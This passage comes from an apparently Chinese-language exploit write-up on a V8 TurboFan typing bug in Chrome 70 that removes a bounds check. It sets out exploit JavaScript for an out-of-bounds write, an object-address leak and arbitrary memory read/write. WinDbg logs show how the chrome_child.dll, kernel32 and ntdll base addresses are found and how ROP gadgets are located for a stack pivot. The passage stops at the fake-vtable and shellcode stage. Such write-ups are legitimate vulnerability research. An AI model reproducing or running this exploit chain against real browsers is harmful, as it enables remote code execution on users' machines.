graph()-&gt;NewNode(simplified()-&gt;ArgumentsFrame());</span><br><span class="line">        Node* <span class="keyword">const</span> arguments_length = graph()-&gt;NewNode(</span><br><span class="line">            simplified()-&gt;ArgumentsLength(</span><br><span class="line">                shared.internal_formal_parameter_count(), <span class="literal">false</span>),</span><br><span class="line">            arguments_frame);</span><br><span class="line">        <span class="comment">// Allocate the elements backing store.</span></span><br><span class="line">        <span class="keyword">bool</span> has_aliased_arguments = <span class="literal">false</span>;</span><br><span class="line">        Node* <span class="keyword">const</span> elements = effect = AllocateAliasedArguments(</span><br><span class="line">            effect, control, context, arguments_frame, arguments_length, shared,</span><br><span class="line">            &amp;has_aliased_arguments);</span><br><span class="line">        <span class="comment">// Load the arguments object map.</span></span><br><span class="line">        Node* <span class="keyword">const</span> arguments_map = jsgraph()-&gt;Constant(</span><br><span class="line">            has_aliased_arguments</span><br><span class="line">                ? native_context().fast_aliased_arguments_map()</span><br><span class="line">                : native_context().sloppy_arguments_map());</span><br><span class="line">        <span class="comment">// Actually allocate and initialize the arguments object.</span></span><br><span class="line">        <span class="function">AllocationBuilder <span class="title">a</span><span class="params">(jsgraph(), effect, control)</span></span>;</span><br><span class="line">        Node* properties = jsgraph()-&gt;EmptyFixedArrayConstant();</span><br><span class="line">        STATIC_ASSERT(JSSloppyArgumentsObject::kSize == <span class="number">5</span> * kPointerSize);</span><br><span class="line">        a.Allocate(JSSloppyArgumentsObject::kSize);</span><br><span class="line">        a.Store(AccessBuilder::ForMap(), arguments_map);</span><br><span class="line">        a.Store(AccessBuilder::ForJSObjectPropertiesOrHash(), properties);</span><br><span class="line">        a.Store(AccessBuilder::ForJSObjectElements(), elements);</span><br><span class="line">        a.Store(AccessBuilder::ForArgumentsLength(), arguments_length);</span><br><span class="line">        a.Store(AccessBuilder::ForArgumentsCallee(), callee);</span><br><span class="line">        RelaxControls(node);</span><br><span class="line">        a.FinishAndChange(node);</span><br><span class="line">        <span class="keyword">return</span> Changed(node);</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">      ...</span><br><span class="line"><span class="keyword">void</span> Typer::Decorator::Decorate(Node* node) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node-&gt;op()-&gt;ValueOutputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Only eagerly type-decorate nodes with known input types.</span></span><br><span class="line">    <span class="comment">// Other cases will generally require a proper fixpoint iteration with Run.</span></span><br><span class="line">    <span class="keyword">bool</span> is_typed = NodeProperties::IsTyped(node);</span><br><span class="line">    <span class="keyword">if</span> (is_typed || NodeProperties::AllValueInputsAreTyped(node)) &#123;</span><br><span class="line">      <span class="function">Visitor <span class="title">typing</span><span class="params">(typer_, <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">      Type type = typing.TypeNode(node);</span><br><span class="line">      <span class="keyword">if</span> (is_typed) &#123;</span><br><span class="line">        type = Type::Intersect(type, NodeProperties::GetType(node),</span><br><span class="line">                               typer_-&gt;zone());</span><br><span class="line">      &#125;</span><br><span class="line">      NodeProperties::SetType(node, type);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Type Typer::Visitor::TypeArgumentsLength(Node* node) &#123;</span><br><span class="line">  <span class="keyword">return</span> TypeCache::Get().kArgumentsLengthType;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Type <span class="keyword">const</span> kArgumentsLengthType =</span><br><span class="line">    Type::Range(<span class="number">0.0</span>, Code::kMaxArguments, zone());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kArgumentsBits = <span class="number">16</span>;</span><br><span class="line"><span class="comment">// Reserve one argument count value as the "don't adapt arguments" sentinel.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxArguments = (<span class="number">1</span> &lt;&lt; kArgumentsBits) - <span class="number">2</span>;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">#<span class="number">171</span>:ArgumentsLength[<span class="number">1</span>, <span class="keyword">not</span> rest length](#<span class="number">170</span>:ArgumentsFrame)  [Type: Range(<span class="number">0</span>, <span class="number">65534</span>)]</span><br></pre></td></tr></table></figure><p>然后在load elimination phase里将多余的LoadField remove，直接替换成真正的值，ArgumentsLength</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#102:LoadField, #27:NumberConstant, #70:Checkpoint, #18:JSStackCheck)  [Type: Range(-32768, 32767)]</span><br><span class="line">-&gt;</span><br><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#171:ArgumentsLength, #27:NumberConstant, #70:Checkpoint, #18:JSStackCheck)  [Type: Range(-32768, 32767)]</span><br></pre></td></tr></table></figure><p>于是在simplified lowering phase里，为了修正这个SpeculativeNumberShiftRight的范围，于是再次对其进行typer计算。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Forward propagation of types from type feedback.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunTypePropagationPhase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">bool</span> updated = UpdateFeedbackType(node);    </span><br><span class="line">-&gt;</span><br><span class="line"><span class="function">Type <span class="title">OperationTyper::NumberShiftRight</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToUint32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int32_t</span> min_lhs = lhs.Min();</span><br><span class="line">  <span class="keyword">int32_t</span> max_lhs = lhs.Max();</span><br><span class="line">  <span class="keyword">uint32_t</span> min_rhs = rhs.Min();</span><br><span class="line">  <span class="keyword">uint32_t</span> max_rhs = rhs.Max();</span><br><span class="line">  <span class="keyword">if</span> (max_rhs &gt; <span class="number">31</span>) &#123;</span><br><span class="line">    <span class="comment">// rhs can be larger than the bitmask</span></span><br><span class="line">    max_rhs = <span class="number">31</span>;</span><br><span class="line">    min_rhs = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">min</span> = <span class="built_in">std</span>::<span class="built_in">min</span>(min_lhs &gt;&gt; min_rhs, min_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">max</span> = <span class="built_in">std</span>::<span class="built_in">max</span>(max_lhs &gt;&gt; min_rhs, max_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">max</span> == kMaxInt &amp;&amp; <span class="built_in">min</span> == kMinInt) <span class="keyword">return</span> Type::Signed32();</span><br><span class="line">  <span class="keyword">return</span> Type::Range(<span class="built_in">min</span>, <span class="built_in">max</span>, zone());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Range(<span class="number">0</span>, <span class="number">65534</span>)</span><br><span class="line">Range(<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">min</span> lhs is <span class="number">0</span></span><br><span class="line"><span class="built_in">min</span> rhs is <span class="number">16</span></span><br><span class="line"><span class="built_in">max</span> lhs is <span class="number">65534</span></span><br><span class="line"><span class="built_in">max</span> rhs is <span class="number">16</span></span><br><span class="line">-&gt;</span><br><span class="line"><span class="function">NumberShiftRight <span class="title">Range</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>)</span></span></span><br></pre></td></tr></table></figure><p>由于这个结果被作为数组的index，所以最终在VisitCheckBounds里，会比较这个范围和数组最大的长度，如果始终index小于数组的length，那么就会将其remove掉。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            DeferReplacement(node, node-&gt;InputAt(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="得到任意地址读写和用户态对象leak的原语"><a href="#得到任意地址读写和用户态对象leak的原语" class="headerlink" title="得到任意地址读写和用户态对象leak的原语"></a>得到任意地址读写和用户态对象leak的原语</h3><p>通过a1的单次越界写改掉oob_double_Array的长度，将其改的很大，然后在后面放一个object Array。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">oob_double_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">oob_double_Array[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">object_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">object_Array[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">object_Array[<span class="number">1</span>] = leak;</span><br><span class="line">x = x &gt;&gt; <span class="number">16</span></span><br><span class="line">a1[x * <span class="number">19</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x0000300000000000</span></span><br><span class="line">a1[x * <span class="number">21</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x0000300000000000</span></span><br><span class="line">a1[x * <span class="number">41</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x0000300000000000</span></span><br></pre></td></tr></table></figure><p>通过将要leak的对象放入object Array，然后通过oob_double_Array将该对象越界读出，得到的就是该对象的指针的double表示。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_space_read</span>(<span class="params">leak</span>)</span>&#123;</span><br><span class="line">  object_Array[<span class="number">1</span>] = leak;</span><br><span class="line">  <span class="keyword">return</span> oob_double_Array[<span class="number">23</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们再new一个ArrayBuffer，通过oob_double_Array的越界写，可以改它的backing_store，于是就可以任意地址读写。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">oob_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writePtr</span>(<span class="params">offset, address, value</span>)</span>&#123;</span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span><br><span class="line">  fake_dv[<span class="number">0</span>] = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readPtr</span>(<span class="params">offset, address</span>)</span>&#123;</span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span><br><span class="line">  <span class="keyword">return</span> fake_dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个小trick就是，我们的oob_double_Array和ArrayBuffer的偏移是不固定的。<br>但是通过user_space_read，我们可以先leak出oob_double_Array和oob_buffer的地址，由于oob_double_Array的fixedArray与其偏移是固定的，而oob_buffer的backing_store和oob_buffer的偏移是固定的.<br>所以我们可以计算出这个偏移是多少。</p><h3 id="得到chrome-child-dll的基地址"><a href="#得到chrome-child-dll的基地址" class="headerlink" title="得到chrome_child.dll的基地址"></a>得到chrome_child.dll的基地址</h3><p>leak出一个blink对象div的地址，它偏移0x20的位置是HTMLDivElement对象，读出后，再读出它首部的虚表地址，然后减去和chrome_child.dll的偏移就是chrome_child.dll的基地址了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">let</span> div_addr = user_space_read(div);</span><br><span class="line">alert(<span class="string">"[+] the div_addr is at "</span> + Int64.fromDouble(div_addr).toString());</span><br><span class="line"></span><br><span class="line">el_addr = readPtr(offset, div_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span><br><span class="line">alert(<span class="string">"[+] the el_addr is at "</span> + Int64.fromDouble(el_addr).toString());</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">0:017&gt; dq 0x00004c0eb3ea31f8</span><br><span class="line">00004c0e&#96;b3ea31f8  00007ffb&#96;49c9e910 000001e7&#96;ec4da5c0</span><br><span class="line">00004c0e&#96;b3ea3208  00000000&#96;000e101c 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3218  00004c0e&#96;b3ea2538 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3228  00000000&#96;00000000 00007ffb&#96;4a46d1f0</span><br><span class="line">00004c0e&#96;b3ea3238  00000000&#96;00000000 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3248  00005a68&#96;da2417e8 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3258  00000000&#96;00000000 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3268  00000000&#96;00000000 00000000&#96;00000000</span><br><span class="line">0:017&gt; g</span><br><span class="line">(3d7c.3af4): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">00007ffb&#96;9da98cc0 cc              int     3</span><br><span class="line">0:017&gt; uf 00007ffb&#96;49c9e910</span><br><span class="line">chrome_child!blink::HTMLDivElement::&#96;vftable&#39;:</span><br><span class="line">00007ffb&#96;49c9e910 dcb14b47fb7f    fdiv    qword ptr [rcx+7FFB474Bh]</span><br><span class="line">00007ffb&#96;49c9e916 0000            add     byte ptr [rax],al</span><br><span class="line">00007ffb&#96;49c9e918 3030            xor     byte ptr [rax],dh</span><br><span class="line">00007ffb&#96;49c9e91a c247fb          ret     0FB47h</span><br><span class="line">0:017&gt; !address chrome_child</span><br><span class="line"></span><br><span class="line">                                     </span><br><span class="line">Mapping file section regions...</span><br><span class="line">Mapping module regions...</span><br><span class="line">Mapping PEB regions...</span><br><span class="line">Mapping TEB and stack regions...</span><br><span class="line">Mapping heap regions...</span><br><span class="line">Mapping page heap regions...</span><br><span class="line">Mapping other regions...</span><br><span class="line">Mapping stack trace database regions...</span><br><span class="line">Mapping activation context regions...</span><br><span class="line"></span><br><span class="line">Usage:                  Image</span><br><span class="line">Base Address:           00007ffb&#96;45960000</span><br><span class="line">End Address:            00007ffb&#96;45961000</span><br><span class="line">Region Size:            00000000&#96;00001000 (   4.000 kB)</span><br><span class="line">State:                  00001000          MEM_COMMIT</span><br><span class="line">Protect:                00000002          PAGE_READONLY</span><br><span class="line">Type:                   01000000          MEM_IMAGE</span><br><span class="line">Allocation Base:        00007ffb&#96;45960000</span><br><span class="line">Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY</span><br><span class="line">Image Path:             C:\Program Files (x86)\Google\Chrome\Application\70.0.3538.110\chrome_child.dll</span><br><span class="line">Module Name:            chrome_child</span><br><span class="line">Loaded Image Name:      C:\Program Files (x86)\Google\Chrome\Application\70.0.3538.110\chrome_child.dll</span><br><span class="line">Mapped Image Name:      </span><br><span class="line">More info:              lmv m chrome_child</span><br><span class="line">More info:              !lmi chrome_child</span><br><span class="line">More info:              ln 0x7ffb45960000</span><br><span class="line">More info:              !dh 0x7ffb45960000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content source: 1 (target), length: 1000</span><br><span class="line">0:017&gt; ? 00007ffb&#96;49c9e910-00007ffb&#96;45960000</span><br><span class="line">Evaluate expression: 70510864 &#x3D; 00000000&#96;0433e910</span><br></pre></td></tr></table></figure><h3 id="计算kernel32的基地址"><a href="#计算kernel32的基地址" class="headerlink" title="计算kernel32的基地址"></a>计算kernel32的基地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; x chrome_child!*CreateEventW*</span><br><span class="line">00007ffb&#96;465faea2 chrome_child!media::MediaLog::CreateEventW (media::MediaLogEvent::Type)</span><br><span class="line">00007ffb&#96;4a33b4f8 chrome_child!_imp_CreateEventW &#x3D; &lt;no type information&gt;</span><br><span class="line"></span><br><span class="line">0:016&gt; dq 00007ffb&#96;4a33b4f8</span><br><span class="line">00007ffb&#96;4a33b4f8  00007ffb&#96;9c001f20</span><br><span class="line">0:016&gt; u 00007ffb&#96;9c001f20</span><br><span class="line">KERNEL32!CreateEventW:</span><br><span class="line">00007ffb&#96;9c001f20 ff2522480500    jmp     qword ptr [KERNEL32!_imp_CreateEventW (00007ffb&#96;9c056748)]</span><br><span class="line">00007ffb&#96;9c001f26 cc              int     3</span><br><span class="line">00007ffb&#96;9c001f27 cc              int     3</span><br><span class="line">00007ffb&#96;9c001f28 cc              int     3</span><br><span class="line">00007ffb&#96;9c001f29 cc              int     3</span><br><span class="line">00007ffb&#96;9c001f2a cc              int     3</span><br><span class="line">00007ffb&#96;9c001f2b cc              int     3</span><br><span class="line">00007ffb&#96;9c001f2c cc              int     3</span><br></pre></td></tr></table></figure><h3 id="计算ntdll的基地址"><a href="#计算ntdll的基地址" class="headerlink" title="计算ntdll的基地址"></a>计算ntdll的基地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; x KERNEL32!*NtQueryEvent*</span><br><span class="line">00007ffb&#96;9c056dd8 KERNEL32!_imp_NtQueryEvent &#x3D; &lt;no type information&gt;</span><br><span class="line">0:016&gt; dq 00007ffb&#96;9c056dd8</span><br><span class="line">00007ffb&#96;9c056dd8  00007ffb&#96;9da95db0</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb&#96;9da95db0</span><br><span class="line">ntdll!NtQueryEvent:</span><br><span class="line">00007ffb&#96;9da95db0 4c8bd1          mov     r10,rcx</span><br><span class="line">00007ffb&#96;9da95db3 b856000000      mov     eax,56h</span><br><span class="line">00007ffb&#96;9da95db8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000&#96;7ffe0308)],1</span><br><span class="line">00007ffb&#96;9da95dc0 7503            jne     ntdll!NtQueryEvent+0x15 (00007ffb&#96;9da95dc5)</span><br><span class="line">00007ffb&#96;9da95dc2 0f05            syscall</span><br><span class="line">00007ffb&#96;9da95dc4 c3              ret</span><br><span class="line">00007ffb&#96;9da95dc5 cd2e            int     2Eh</span><br></pre></td></tr></table></figure><h3 id="寻找gadaget"><a href="#寻找gadaget" class="headerlink" title="寻找gadaget"></a>寻找gadaget</h3><h4 id="栈劫持"><a href="#栈劫持" class="headerlink" title="栈劫持"></a>栈劫持</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00007ff9&#96;296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]</span><br><span class="line">00007ff9&#96;296f0709 488b6918        mov     rbp,qword ptr [rcx+18h]</span><br><span class="line">00007ff9&#96;296f070d 488b6110        mov     rsp,qword ptr [rcx+10h]</span><br><span class="line">00007ff9&#96;296f0711 ffe2            jmp     rdx</span><br></pre></td></tr></table></figure><p>search-&gt;sequence of bytes<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-12-03-084700.png" alt=""></p><h4 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; pop rcx ; ret     59 c3</span><br><span class="line">&#x2F;&#x2F; pop rdx ; ret       5a c3</span><br><span class="line">&#x2F;&#x2F; pop r8 ; ret      41 58 c3</span><br><span class="line">&#x2F;&#x2F; pop r9 ; ret      41 59 c3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; u 00007ffb&#96;45d6982c</span><br><span class="line">chrome_child!blink::AutoscrollController::HandleMouseMoveForMiddleClickAutoscroll+0x16c [C:\b\c\b\win64_clang\src\third_party\blink\renderer\core\page\autoscroll_controller.cc @ 237]:</span><br><span class="line">00007ffb&#96;45d6982c 59              pop     rcx</span><br><span class="line">00007ffb&#96;45d6982d c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb&#96;45960000 L1000000 C359</span><br><span class="line">00007ffb&#96;45d6982c  c359 0ff3 4411 2024 0ff3 7c11 2424 2e0f  Y....D$ ...|$$..</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb&#96;45a8d91a</span><br><span class="line">chrome_child!cc::SingleKeyframeEffectAnimation::SingleKeyframeEffectAnimation+0x3a [C:\b\c\b\win64_clang\src\cc\animation\single_keyframe_effect_animation.cc @ 44]:</span><br><span class="line">00007ffb&#96;45a8d91a 5a              pop     rdx</span><br><span class="line">00007ffb&#96;45a8d91b c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb&#96;45960000 L1000000 C35a</span><br><span class="line">00007ffb&#96;45a8d91a  c35a 4803 c389 8b48 7856 2b48 7056 c148  Z..H..H.VxH+VpH.</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb&#96;46b16012</span><br><span class="line">chrome_child!v8::internal::compiler::RawMachineAssembler::TargetParameter+0x2 [C:\b\c\b\win64_clang\src\v8\src\compiler\raw-machine-assembler.cc @ 82]:</span><br><span class="line">00007ffb&#96;46b16012 4158            pop     r8</span><br><span class="line">00007ffb&#96;46b16014 c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb&#96;45960000 L1000000 5841</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffb&#96;46b16012  5841 ccc3 cccc cccc cccc cccc cccc 4856  AX............VH</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb&#96;472db44c</span><br><span class="line">chrome_child!DeblockLumaTransposeH2V_sse2+0x1ec:</span><br><span class="line">00007ffb&#96;472db44c 4159            pop     r9</span><br><span class="line">00007ffb&#96;472db44e c3              ret</span><br><span class="line">00007ffb&#96;472db44f 90              nop</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb&#96;45960000 L1000000 5941</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffb&#96;472db44c  5941 90c3 5141 4850 ec83 f320 7f0f 2434  AY..AQPH.. ...4$</span><br></pre></td></tr></table></figure><h3 id="创建一块大的可读写空间，fake-vtable和栈伪造，栈劫持和mprotect执行shellcode"><a href="#创建一块大的可读写空间，fake-vtable和栈伪造，栈劫持和mprotect执行shellcode" class="headerlink" title="创建一块大的可读写空间，fake 